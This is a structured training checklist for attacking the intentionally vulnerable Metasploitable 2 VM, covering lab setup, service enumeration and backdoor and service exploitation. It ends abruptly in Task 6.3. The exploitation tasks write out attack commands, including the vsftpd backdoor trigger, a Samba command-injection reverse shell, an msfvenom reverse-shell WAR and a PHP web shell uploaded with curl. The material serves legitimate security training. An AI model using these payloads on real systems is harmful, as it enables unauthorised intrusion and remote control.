# 🐧 Metasploitable 2: Complete Offensive Security Learning Checklist

> **Purpose:** This is not a "hack the box" walkthrough. It is a structured **learning curriculum** that uses Metasploitable 2 as a training ground to build real penetration testing skills from zero. Every task teaches a concept, not just an exploit.

> [!CAUTION]
> Use this **only** in your own isolated, private host-only lab network. Never run these techniques against systems you do not own or have explicit written authorization to test.

---

## 🧭 Navigation

- 🏠 [Lab Main Info](../INFO.md)
- 🌐 [OWASP Broken WebApps Tasks](../OWASP_Broken_WebApps/TASK_LIST.md)
- 📋 [Master Roadmap](../../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Levels | Tasks |
|:---:|:---|:---:|:---:|
| 🏗️ Phase 1 | Foundation & Setup | 0–1 | 12 |
| 🔍 Phase 2 | Reconnaissance & Enumeration | 2–3 | 15 |
| ⚔️ Phase 3 | Exploitation Core | 4–7 | 22 |
| 👑 Phase 4 | Post-Exploitation & Escalation | 8–9 | 12 |
| 🛡️ Phase 5 | Defense, Reporting & Mastery | 10–12 | 12 |
| | **Total** | | **73** |

---

# 🏗️ PHASE 1: FOUNDATION & LAB SETUP

---

## Level 0: Lab Environment & Methodology

*Before touching any tool, establish your lab, your notes system, and your mental model for how pentests work.*

---

### Task 0.1 — Build the Isolated Lab Network

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Create a completely isolated virtual network containing your attacker VM (Kali/Parrot) and the Metasploitable 2 target, with no route to the internet or your host OS LAN. |
| **Skills Learned** | Virtual networking (Host-Only adapters), hypervisor configuration, network isolation principles, understanding why isolation matters for legal and safety reasons. |
| **Tools Used** | VirtualBox or VMware (Host-Only Adapter settings), `ip addr`, `ifconfig`. |
| **Expected Output** | Both VMs can `ping` each other. Neither VM can reach your home router or the internet. Screenshot of both VMs showing IPs on the same subnet. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | Screenshot of VirtualBox/VMware network adapter settings for both VMs. Screenshot of successful ping in both directions. Screenshot of failed ping to your home gateway. |
| **Common Mistakes** | Using NAT instead of Host-Only (exposes Metasploitable to the internet). Forgetting to disable the second NIC on Metasploitable. Not verifying isolation — just assuming it works. |

---

### Task 0.2 — Create Your Documentation Framework

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Set up a structured note-taking system that mirrors professional pentest workflow: recon → enumeration → exploitation → post-exploitation → reporting. |
| **Skills Learned** | Professional documentation habits, evidence chain management, the pentest lifecycle model (PTES phases). |
| **Tools Used** | Markdown editor (Obsidian, VS Code), terminal (`mkdir -p`), Git. |
| **Expected Output** | Directory tree: `lab-notes/metasploitable2/{setup,recon,enumeration,exploitation,post-exploitation,privesc,defense,reports}`. A `setup-notes.md` file with target IP, attacker IP, network mode, date, tool versions. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | The directory tree output (`tree lab-notes/`). The completed `setup-notes.md`. |
| **Common Mistakes** | Not documenting at all and relying on memory. Using unstructured flat files instead of organized directories. Not recording tool versions (matters for reproducibility). |

---

### Task 0.3 — Take a Clean Baseline Snapshot

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Snapshot the Metasploitable 2 VM in its clean, pre-exploitation state so you can restore it after each testing phase. |
| **Skills Learned** | VM snapshot management, the importance of repeatable lab environments, why "golden images" matter in both red and blue team work. |
| **Tools Used** | VirtualBox Snapshot Manager or VMware Snapshot. |
| **Expected Output** | Named snapshot (e.g., `ms2-clean-baseline-YYYY-MM-DD`) visible in the hypervisor's snapshot tree. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | Screenshot of the snapshot manager showing the named baseline. |
| **Common Mistakes** | Forgetting to snapshot before exploitation, making it impossible to reset. Taking snapshots while the VM is running (can cause state issues in some hypervisors). |

---

### Task 0.4 — Understand the Pentest Lifecycle

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Before scanning anything, read and summarize the five phases of a penetration test: (1) Reconnaissance, (2) Scanning & Enumeration, (3) Exploitation, (4) Post-Exploitation, (5) Reporting. Understand where each level of this checklist fits. |
| **Skills Learned** | PTES methodology awareness, understanding that pentesting is a structured process — not random exploitation, knowing what deliverables each phase produces. |
| **Tools Used** | Web browser (PTES documentation), your notes editor. |
| **Expected Output** | A one-page summary in your own words: what each phase does, what it produces, and what tools are typically used. Map each Level of this checklist to a PTES phase. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | Your summary document. |
| **Common Mistakes** | Skipping this and jumping straight to Nmap. Not understanding that reconnaissance comes before exploitation. Treating pentesting as "run tool, get shell" instead of a methodical process. |

---

## Level 1: Network Fundamentals & First Contact

*Make first contact with the target. Learn to read network responses and understand what ports, protocols, and services actually mean.*

---

### Task 1.1 — ARP Discovery & Layer 2 Understanding

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Discover the Metasploitable 2 host on the local network segment using Layer 2 (ARP) techniques. Understand why ARP works when ping might not. |
| **Skills Learned** | ARP protocol mechanics, Layer 2 vs Layer 3 discovery, why ARP bypasses host firewalls, MAC address identification. |
| **Tools Used** | `arp-scan -l`, `netdiscover -r <subnet>`, `nmap -sn <subnet>`. |
| **Expected Output** | Target IP and MAC address identified. Explanation of why ARP discovery works even when ICMP is blocked. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | Full `arp-scan` output. Note the MAC address vendor (can reveal VM platform). |
| **Common Mistakes** | Running `arp-scan` on the wrong interface (e.g., eth0 instead of the Host-Only adapter). Not understanding the difference between `-sn` (ping sweep) and `-sP` (deprecated). Confusing Layer 2 discovery with port scanning. |

---

### Task 1.2 — Full TCP Port Scan

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Discover every open TCP port on the target by scanning all 65,535 ports. Understand what an "open port" actually means at the TCP level (SYN → SYN-ACK). |
| **Skills Learned** | TCP three-way handshake, SYN scanning vs connect scanning, port states (open, closed, filtered), why scanning all ports matters (services often hide on non-standard ports). |
| **Tools Used** | `nmap -p- -T4 <target>`, `nmap -p- -sS <target>` (SYN scan, requires root). |
| **Expected Output** | A list of all open TCP ports (expect ~23+ open ports on Metasploitable 2). Save output in all three Nmap formats: `-oN` (normal), `-oG` (grepable), `-oX` (XML). |
| **Difficulty** | ⭐ Beginner |
| **Save These** | Raw Nmap output files in all three formats. A clean markdown table mapping port numbers to your initial guesses about each service. |
| **Common Mistakes** | Scanning only the default top 1000 ports and missing services on high ports (e.g., port 1524 ingreslock backdoor). Using `-T5` timing which can miss ports. Not saving output to files (`-oA`). Running SYN scan without root privileges. |

---

### Task 1.3 — Service Version & Script Detection

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Identify the exact software name and version running on every open port. Run default Nmap scripts to gather additional intelligence (e.g., anonymous FTP access, SSH algorithms, SMB OS detection). |
| **Skills Learned** | Service fingerprinting via banner grabbing, NSE (Nmap Scripting Engine) basics, understanding version strings and their security implications, OS detection via network stack behavior. |
| **Tools Used** | `nmap -p- -sV -sC -O <target> -oA ms2-full-scan`. |
| **Expected Output** | Complete service map with version strings. Notable findings from default scripts (e.g., `ftp-anon: Anonymous FTP login allowed`). OS detection result. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | Full Nmap output with all script results. Create a **Service Inventory Table** with columns: Port, Protocol, Service, Version, Script Findings, Risk Notes. This becomes your attack planning document. |
| **Common Mistakes** | Not combining `-sV` with `-sC` (version detection alone misses script intelligence). Not saving the XML output (needed for importing into other tools later). Ignoring script output — it often reveals immediate wins like anonymous access or default credentials. |

---

### Task 1.4 — UDP Service Discovery

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Identify services running on UDP ports. Understand why UDP scanning is slower and less reliable than TCP, and why attackers still do it. |
| **Skills Learned** | UDP protocol behavior (no handshake, no guaranteed response), why UDP scans produce more "open\|filtered" results, which critical services use UDP (DNS, SNMP, TFTP, NFS portmapper). |
| **Tools Used** | `nmap -sU --top-ports 50 -sV <target>`, `nmap -sU -p 53,67,69,111,137,161,2049 <target>`. |
| **Expected Output** | List of confirmed open UDP ports with service versions. Explanation of why most UDP ports show "open\|filtered" and what that means. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | UDP scan output. Notes explaining the difference between TCP and UDP scan reliability. |
| **Common Mistakes** | Scanning all 65,535 UDP ports (takes hours, rarely useful). Not running with root privileges (required for UDP scanning). Ignoring UDP entirely — services like SNMP and NFS portmapper can be goldmines. |

---

### Task 1.5 — Build Your Attack Planning Matrix

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Consolidate all reconnaissance data into a single attack planning document. For each service, research whether the version has known vulnerabilities, rate the risk, and plan your enumeration approach. |
| **Skills Learned** | Attack surface analysis, risk prioritization, research methodology (CVE databases, exploit-db), the difference between a "finding" and a "vulnerability". |
| **Tools Used** | Your notes editor, `searchsploit` (local exploit-db), Google/CVE databases. |
| **Expected Output** | A master table with columns: Port, Service, Version, Known CVEs, Exploit Candidates, Enumeration Plan, Priority (High/Medium/Low). |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | The completed attack planning matrix. This document guides everything from Level 2 onward. |
| **Common Mistakes** | Jumping straight to exploitation without planning. Not researching versions — many services on Metasploitable 2 have well-known, version-specific vulnerabilities. Treating all services as equal priority (focus on services that give shells first). |

---

# 🔍 PHASE 2: DEEP ENUMERATION

---

## Level 2: Protocol-Level Service Enumeration

*Interact manually with each exposed service. Learn what information each protocol leaks and why defenders should care.*

---

### Task 2.1 — FTP Enumeration & Anonymous Access

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Manually connect to the FTP service, verify anonymous access, inspect available files, and test upload permissions. Understand the vsftpd version running and its significance. |
| **Skills Learned** | FTP protocol commands (USER, PASS, LIST, GET, PUT), anonymous access risks, banner grabbing, understanding how vsftpd 2.3.4 contains an intentional backdoor trigger. |
| **Tools Used** | `ftp <target>`, `nc <target> 21`, `nmap --script ftp-anon,ftp-vsftpd-backdoor <target>`. |
| **Expected Output** | Confirmed anonymous login. List of accessible files. Upload test result (can you write?). Captured banner showing vsftpd version string. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Terminal session showing the FTP banner, anonymous login, directory listing, and file retrieval. Note the vsftpd version for use in Level 4. |
| **Common Mistakes** | Not testing write access (some anonymous FTP allows uploads — this is critical). Only running automated scripts without manually connecting to understand the protocol. Not noting the exact version number (2.3.4 is specifically backdoored). |

---

### Task 2.2 — SSH Banner Analysis & Key Fingerprinting

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Identify the SSH version, supported key exchange algorithms, and authentication methods. Understand why old SSH versions and weak algorithms are security risks. |
| **Skills Learned** | SSH protocol versioning, key exchange negotiation, authentication method enumeration, why SSHv1 is vulnerable to MITM attacks. |
| **Tools Used** | `ssh -v <target>`, `nc <target> 22`, `nmap --script ssh2-enum-algos,ssh-hostkey <target>`. |
| **Expected Output** | SSH version banner (OpenSSH version on Ubuntu). List of supported algorithms. Identification of any weak ciphers or key exchange methods. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | SSH banner output. Algorithm enumeration results. Notes on which algorithms are considered weak and why. |
| **Common Mistakes** | Ignoring SSH because "it's encrypted so it's safe." Not checking for SSHv1 support. Not understanding that knowing the exact OpenSSH version reveals the OS version and patch level. |

---

### Task 2.3 — Telnet Manual Interaction

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Connect to the Telnet service and understand why Telnet is fundamentally insecure. Capture credentials in transit to prove the risk. |
| **Skills Learned** | Plain-text protocol risks, credential sniffing, why Telnet should never be used on production networks, Wireshark packet analysis basics. |
| **Tools Used** | `telnet <target>`, Wireshark (capture on the Host-Only interface). |
| **Expected Output** | Successful Telnet login using known credentials. Wireshark capture showing the username and password transmitted in cleartext. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Screenshot of successful Telnet login. Wireshark capture (`.pcap` file) showing cleartext credentials. Side-by-side comparison with an SSH login capture showing encrypted traffic. |
| **Common Mistakes** | Not capturing with Wireshark to prove the cleartext risk. Knowing "Telnet is bad" but not being able to demonstrate why with evidence. Not comparing Telnet capture vs SSH capture to see the difference. |

---

### Task 2.4 — SMB & Samba Deep Enumeration

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Enumerate SMB shares, users, groups, policies, and OS information. Identify the exact Samba version and understand its attack surface. |
| **Skills Learned** | SMB/CIFS protocol mechanics, null session enumeration, share permissions vs file permissions, Samba version significance (3.0.20 has known RCE). |
| **Tools Used** | `enum4linux -a <target>`, `smbclient -L //<target> -N`, `smbmap -H <target>`, `nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery <target>`. |
| **Expected Output** | List of shares with permissions. Enumerated usernames. OS and Samba version. Workgroup/domain name. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Full `enum4linux` output. Share listing with read/write permissions noted. User list. Samba version for exploit research. |
| **Common Mistakes** | Only using one tool — each SMB enumeration tool reveals different details. Not testing actual share access with `smbclient` after listing. Not noting that Samba 3.0.20 has a critical `username map script` RCE vulnerability. |

---

### Task 2.5 — NFS Export Enumeration & Mounting

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Discover NFS exports, mount them locally, and inspect the contents. Understand the trust model NFS uses (UID/GID-based, no authentication by default). |
| **Skills Learned** | NFS protocol mechanics, export permissions, UID/GID spoofing concept, why NFS without Kerberos is dangerous, how attackers use NFS to plant SSH keys. |
| **Tools Used** | `showmount -e <target>`, `mount -t nfs <target>:/ /mnt/nfs`, `nmap --script nfs-ls,nfs-showmount <target>`. |
| **Expected Output** | List of exported directories. Mounted NFS share contents. Identification of sensitive files (SSH keys, config files, password files). |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | `showmount` output. Directory listing of mounted shares. Any sensitive files found. Notes on why NFS trusting UID 0 from any client is dangerous. |
| **Common Mistakes** | Not creating the mount point directory first. Not unmounting after inspection (`umount /mnt/nfs`). Not understanding that NFS trusts the client's claimed UID — if you mount as root, you read as root. |

---

### Task 2.6 — SMTP User Enumeration

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Use the SMTP service to enumerate valid system usernames using the `VRFY` and `EXPN` commands. Understand why mail servers that allow user verification are an information disclosure risk. |
| **Skills Learned** | SMTP protocol commands, user enumeration via mail services, information disclosure impact, how enumerated users feed into brute-force attacks. |
| **Tools Used** | `nc <target> 25` (manual SMTP commands), `smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <target>`. |
| **Expected Output** | List of confirmed valid system usernames. Demonstration of `VRFY root`, `VRFY msfadmin`, etc. returning positive responses. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Raw Netcat SMTP session showing VRFY commands and responses. Automated enumeration results. Notes on which usernames were confirmed. |
| **Common Mistakes** | Not understanding SMTP response codes (252 = user exists, 550 = user does not exist). Using only automated tools without manually understanding the protocol conversation. Not feeding confirmed usernames into credential attacks later. |

---

### Task 2.7 — RPC & Portmapper Enumeration

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Query the RPC portmapper to discover all registered RPC services, their program numbers, and listening ports. |
| **Skills Learned** | RPC/portmapper architecture, how NFS/NIS/mountd register with rpcbind, why portmapper exposure reveals internal service architecture. |
| **Tools Used** | `rpcinfo -p <target>`, `nmap --script rpcinfo <target> -p 111`. |
| **Expected Output** | Full RPC program listing with program numbers, versions, protocols, and ports. Identification of NFS (program 100003), mountd, NIS (ypserv), and status services. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Complete `rpcinfo` output. Notes mapping each RPC program number to its service name and security implications. |
| **Common Mistakes** | Ignoring RPC output because it looks cryptic. Not recognizing that RPC program numbers map to specific services (100003 = NFS, 100005 = mountd). Not correlating RPC ports with Nmap scan results. |

---

## Level 3: Database & Web Service Enumeration

*Extend enumeration to databases, web servers, and application-layer services.*

---

### Task 3.1 — MySQL Enumeration with Blank Root

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Connect to the MySQL service and enumerate databases, tables, and users. Understand the impact of a database server with no root password. |
| **Skills Learned** | MySQL client usage, SQL basics (SHOW DATABASES, SELECT, DESCRIBE), database user privilege enumeration, why databases should never bind to 0.0.0.0 with blank passwords. |
| **Tools Used** | `mysql -u root -h <target>`, `nmap --script mysql-info,mysql-enum,mysql-databases <target>`. |
| **Expected Output** | Successful login as root with no password. List of all databases. User privilege table dump. At least one table with sensitive data (e.g., DVWA users table). |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | MySQL session showing login, database listing, table enumeration, and data extraction. Notes on what a blank root password means for the entire system. |
| **Common Mistakes** | Forgetting the `-h` flag (connecting to localhost instead of remote). Not exploring beyond `SHOW DATABASES` — dig into table structures. Not noting that MySQL root with FILE privilege can read/write server files. |

---

### Task 3.2 — PostgreSQL Enumeration

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Authenticate to the PostgreSQL service and enumerate databases, schemas, roles, and privileges. Test for command execution capabilities. |
| **Skills Learned** | PostgreSQL client usage, `psql` meta-commands (`\l`, `\dt`, `\du`), PostgreSQL-specific attack surface (COPY TO/FROM, command execution via extensions). |
| **Tools Used** | `psql -h <target> -U postgres`, `nmap --script pgsql-brute <target>`. |
| **Expected Output** | Successful login with default credentials. Database and role listing. Demonstration of `COPY` command or command execution if possible. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Full `psql` session showing authentication, database enumeration, and any command execution attempts. |
| **Common Mistakes** | Not knowing PostgreSQL uses different authentication (md5 vs trust vs peer). Not checking if `postgres` user has superuser privileges. Ignoring PostgreSQL because MySQL was already compromised. |

---

### Task 3.3 — Web Application Discovery & Mapping

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Enumerate all web applications hosted on port 80 and port 8180. Create a complete inventory of each application, its purpose, and its technology stack. |
| **Skills Learned** | Web directory brute-forcing, virtual host discovery, application fingerprinting, understanding that a single server often hosts multiple attack surfaces. |
| **Tools Used** | `gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt`, `nikto -h <target>`, browser manual inspection. |
| **Expected Output** | Complete application inventory: DVWA, Mutillidae, phpMyAdmin, TWiki, WebDAV, Tomcat (port 8180), and any others. Technology notes for each (PHP version, database backend). |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Full `gobuster` and `nikto` output. Your application inventory table. Screenshots of each application's landing page. |
| **Common Mistakes** | Only checking port 80 and missing Tomcat on 8180. Not running `nikto` (it catches misconfigurations that directory brute-forcing misses). Not manually browsing to found directories — automated tools miss context. |

---

### Task 3.4 — Tomcat Manager Enumeration

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Access the Apache Tomcat Manager console on port 8180. Enumerate default credentials and understand the deployment capabilities this console provides. |
| **Skills Learned** | Tomcat architecture (catalina, webapps directory), Manager and Host-Manager roles, WAR file deployment concept, how default credentials lead to RCE. |
| **Tools Used** | Browser (`http://<target>:8180/manager/html`), `nmap --script http-tomcat-manager-default <target> -p 8180`, `hydra` (if brute-forcing). |
| **Expected Output** | Successful login to Tomcat Manager. List of deployed applications. Understanding of the "Deploy" function that accepts WAR file uploads. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Screenshot of successful Tomcat Manager login. List of default credentials tested. Notes on what WAR file deployment enables (arbitrary code execution). |
| **Common Mistakes** | Not checking port 8180 (only scanning 80). Not understanding that Tomcat Manager WAR deployment is equivalent to arbitrary code execution. Testing only `admin:admin` and not trying other defaults like `tomcat:tomcat`. |

---

### Task 3.5 — VNC Service Enumeration

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Connect to the VNC service and understand the authentication mechanism. Identify whether a password is required and its strength. |
| **Skills Learned** | VNC protocol basics, RFB authentication, VNC password file storage (`~/.vnc/passwd`), why VNC passwords are limited to 8 characters. |
| **Tools Used** | `vncviewer <target>:5900`, `nmap --script vnc-info <target> -p 5900`. |
| **Expected Output** | VNC connection established. Desktop or shell access obtained. Notes on the password used and VNC's inherent 8-character password limitation. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Screenshot of VNC connection showing the remote desktop. Notes on VNC security limitations. |
| **Common Mistakes** | Not installing a VNC viewer on the attacker machine. Not understanding that VNC sends display data — it's full graphical access, not just a command shell. Not noting the password for credential reuse testing later. |

---

# ⚔️ PHASE 3: EXPLOITATION CORE

---

## Level 4: Backdoor & Trust Exploitation

*Exploit pre-existing backdoors and trust misconfigurations. These are the "easy wins" — learn why they exist and what they teach about system hardening.*

---

### Task 4.1 — Ingreslock Backdoor (Port 1524)

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Connect to port 1524 and obtain an immediate root shell. Understand what "ingreslock" was historically and why a root shell listener on this port exists. |
| **Skills Learned** | Bindshell concept (a shell listening on a port), the difference between a bindshell and a reverse shell, why open root shells on high ports are catastrophic, historical context of ingreslock. |
| **Tools Used** | `nc <target> 1524`, `nmap -p 1524 -sV <target>`. |
| **Expected Output** | Immediate root shell upon connection. Output of `id`, `whoami`, `hostname`. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | Terminal output showing the connection and `id` command proving root. Notes explaining what a bindshell is and how this differs from an exploited service. |
| **Common Mistakes** | Not understanding that this isn't an "exploit" — it's a pre-planted backdoor. Missing the learning point: scan for unusual high ports, and any service giving a shell without authentication is a critical finding. |

---

### Task 4.2 — Rlogin/Rsh Trust Exploitation

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Use `rlogin` to access the target as root without a password. Understand the `.rhosts` trust mechanism and why r-services are deprecated. |
| **Skills Learned** | Berkeley r-services (rlogin, rsh, rexec), `.rhosts` and `hosts.equiv` trust files, why IP-based authentication is fundamentally broken, history of r-services deprecation in favor of SSH. |
| **Tools Used** | `rlogin -l root <target>`, `rsh <target> <command>`, `cat /etc/hosts.equiv` and `cat ~/.rhosts` (once logged in). |
| **Expected Output** | Root access via rlogin without password prompt. Contents of `.rhosts` or `hosts.equiv` showing the trust configuration. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | Terminal showing passwordless root login. Contents of the trust configuration files. Notes explaining why IP-based trust is insecure (IP spoofing). |
| **Common Mistakes** | Not having `rsh-client` installed on modern Kali (may need `apt install rsh-client`). Not inspecting the trust files to understand why the access worked. Not connecting this to SSH known_hosts as the modern equivalent trust model. |

---

### Task 4.3 — vsftpd 2.3.4 Backdoor Exploitation

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Trigger the vsftpd 2.3.4 backdoor by sending a username containing `:)` (smiley face), then connect to the spawned shell on port 6200. Then repeat using Metasploit. Compare both approaches. |
| **Skills Learned** | Supply chain compromise concept (this backdoor was injected into the source code), manual exploit triggering vs framework automation, how backdoors are hidden in legitimate software, the importance of verifying software integrity. |
| **Tools Used** | Manual: `nc <target> 21` then `USER user:)` then `PASS pass` then `nc <target> 6200`. Metasploit: `use exploit/unix/ftp/vsftpd_234_backdoor`. |
| **Expected Output** | Root shell on port 6200 (manual method). Meterpreter or shell session (Metasploit method). Side-by-side comparison notes. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Manual exploitation terminal transcript. Metasploit console output. Notes comparing effort, reliability, and understanding gained from each method. Write a brief explanation of the backdoor's origin story. |
| **Common Mistakes** | Only using Metasploit and never understanding the trigger mechanism. Not verifying the shell on port 6200 — the backdoor is sometimes unreliable. Not understanding that this was a real-world supply chain attack (2011). |

---

### Task 4.4 — UnrealIRCd 3.2.8.1 Backdoor

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Exploit the backdoored UnrealIRCd service (port 6667) to obtain a reverse shell. Understand that this is another supply chain compromise in the wild. |
| **Skills Learned** | IRC protocol basics, reverse shell mechanics (target connects back to attacker), how to set up a Netcat listener, supply chain attack patterns (compromised source tarball). |
| **Tools Used** | Manual: `nc <target> 6667` then send `AB; <reverse-shell-command>`. Listener: `nc -lvnp 4444`. Metasploit: `use exploit/unix/irc/unreal_ircd_3281_backdoor`. |
| **Expected Output** | Reverse shell connection received on your listener. Confirmation of user context (`id`, `whoami`). |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Listener terminal showing incoming connection. Shell session output. Notes on the difference between a bindshell (Task 4.1) and a reverse shell (this task). |
| **Common Mistakes** | Not setting up the listener before triggering the backdoor. Using the wrong IP in the reverse shell command (must be your attacker IP, not the target's). Firewall on the attacker machine blocking the incoming connection. |

---

## Level 5: Network Service Exploitation

*Exploit vulnerabilities in legitimate services — not backdoors — to achieve remote code execution.*

---

### Task 5.1 — Samba usermap_script RCE (CVE-2007-2447)

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Exploit the Samba 3.0.20 `username map script` vulnerability to achieve remote code execution. Understand command injection through service configuration directives. |
| **Skills Learned** | Command injection in configuration parameters, how metacharacters in usernames can escape into shell execution, Samba security architecture, CVE research methodology. |
| **Tools Used** | Manual: `smbclient //target/tmp -U './=`nohup <reverse-shell>`'`. Metasploit: `use exploit/multi/samba/usermap_script`. Listener: `nc -lvnp 4444`. |
| **Expected Output** | Reverse shell as root. CVE-2007-2447 research notes showing affected versions, CVSS score, and remediation. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Manual exploitation command and shell proof. Metasploit session output. CVE research notes. Explanation of why the `username map script` directive was dangerous. |
| **Common Mistakes** | Not escaping special characters properly in the manual exploit. Not understanding that this is a command injection in a config directive, not a buffer overflow. Not researching the CVE to understand the root cause. |

---

### Task 5.2 — distccd Remote Code Execution (CVE-2004-2687)

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Exploit the distccd distributed compiler daemon to execute arbitrary commands. Understand why network-exposed build services are dangerous. |
| **Skills Learned** | Distributed compilation concept, why build infrastructure should never face untrusted networks, the difference between authentication bypass and missing authentication entirely. |
| **Tools Used** | `nmap --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'" <target> -p 3632`. Metasploit: `use exploit/unix/misc/distcc_exec`. |
| **Expected Output** | Command execution as the `daemon` user (not root — this is important). Output of `id` showing a non-root user. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Command execution proof. Note that this gives a low-privilege shell — you will need privilege escalation (Level 9). |
| **Common Mistakes** | Assuming this gives root (it gives `daemon` user). Not noting the non-root context — this is a launching point for privilege escalation practice. Not understanding what distccd is and why it exists. |

---

### Task 5.3 — Java RMI Registry Exploitation

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Exploit the Java RMI Registry service to achieve remote code execution. Understand Java serialization attacks and why RMI exposure is dangerous. |
| **Skills Learned** | Java RMI architecture, object serialization/deserialization, why Java services are a rich attack surface, class loading attacks. |
| **Tools Used** | Metasploit: `use exploit/multi/misc/java_rmi_server`. Manual: research `ysoserial` and `rmg` for understanding. |
| **Expected Output** | Shell or Meterpreter session. Understanding of Java deserialization as an attack class. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Exploitation output. Notes explaining Java RMI in simple terms. Research notes on Java deserialization attacks as a broader vulnerability class. |
| **Common Mistakes** | Only using Metasploit without understanding what RMI is. Not connecting this to the broader Java deserialization vulnerability class (relevant to many enterprise applications). |

---

## Level 6: Web Application & Middleware Exploitation

*Attack web applications and middleware consoles to deploy code and gain server access.*

---

### Task 6.1 — Tomcat WAR File Deployment to Shell

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Package a JSP reverse shell into a WAR file, deploy it through the Tomcat Manager console, and trigger it to receive a shell. Do this both manually and with Metasploit. |
| **Skills Learned** | WAR file structure, JSP web shells, Tomcat deployment mechanics, how authenticated admin consoles become code execution vectors, the `jar` command for creating archives. |
| **Tools Used** | Manual: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f war -o shell.war`, deploy via Tomcat Manager web UI, trigger: `curl http://<target>:8180/shell/`. Metasploit: `use exploit/multi/http/tomcat_mgr_upload`. |
| **Expected Output** | Reverse shell received as the Tomcat user. WAR file visible in deployed applications list. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | WAR file creation command. Deployment screenshot. Shell session proof. Notes comparing manual vs Metasploit workflow. |
| **Common Mistakes** | Wrong LHOST (using target IP instead of attacker IP). Forgetting to start the listener before deploying. Not cleaning up the deployed WAR file afterward. Not understanding that any admin console with deployment capability = RCE. |

---

### Task 6.2 — WebDAV File Upload to Shell

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Upload a PHP web shell to the WebDAV directory using PUT requests. Understand the WebDAV protocol and why writable web directories are critical vulnerabilities. |
| **Skills Learned** | WebDAV protocol (HTTP extensions for distributed authoring), PUT method for file creation, PHP web shell construction, why web-writable directories are dangerous. |
| **Tools Used** | `cadaver http://<target>/dav/`, `curl -X PUT http://<target>/dav/shell.php -d '<?php system($_GET["cmd"]); ?>'`, `davtest -url http://<target>/dav/`. |
| **Expected Output** | Successful file upload confirmation. PHP shell accessible via browser. Command execution through `?cmd=id`. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Upload command and server response. Browser screenshot showing command execution. `davtest` output showing allowed file types. |
| **Common Mistakes** | Not checking which file types are allowed (some WebDAV configs block `.php` but allow `.txt` — test with `davtest` first). Uploading without verifying execution — the file might upload but not execute. |

---

### Task 6.3 — PHP CGI Argument Injection (CVE-2012-1823)

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Exploit the PHP CGI argument injection vulnerability to execute system commands through specially crafted HTTP requests. |
